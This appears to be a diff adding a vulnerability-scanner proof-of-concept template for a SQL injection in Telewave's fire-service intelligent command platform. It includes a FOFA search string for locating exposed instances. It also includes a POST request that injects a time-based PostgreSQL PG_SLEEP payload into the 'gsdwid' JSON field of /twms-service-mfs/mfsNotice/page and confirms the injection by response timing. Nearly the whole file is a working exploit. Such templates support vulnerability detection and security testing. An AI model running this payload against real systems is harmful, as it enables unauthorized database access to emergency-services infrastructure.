@@ -1,0 +1,28 @@
+id: poc-yaml-telewave-twms-service-mfs-sqli
+info:
+  name: 天维尔消防智能指挥平台 twms-service-mfs SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天维尔消防智能指挥平台
+  fofa: body="1997-2020 天维尔信息科技股份有限公司"
+variables:
+  t1: random_int(1,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: POST
+  path: /twms-service-mfs/mfsNotice/page
+  headers:
+    Content-Type: application/json
+  data: '{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930"''},"hgubmt748n4":"="}'
+  expression: status_code == 400 && contains(body,"JSON parse error") && contains(body,"JsonMappingException")
+- method: POST
+  path: /twms-service-mfs/mfsNotice/page
+  headers:
+    Content-Type: application/json
+  data: '{"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930'')AND
+    5803=(SELECT 5803 FROM PG_SLEEP({{.t1}})) AND (''oJoi''=''oJoi"},"hgubmt748n4":"="}'
+  expression: status_code == 200 && contains(body,"\"msg\":\"请求成功\"") && contains(content_type,"application/json")
+    && duration > t2 && duration < t3
+transport: http
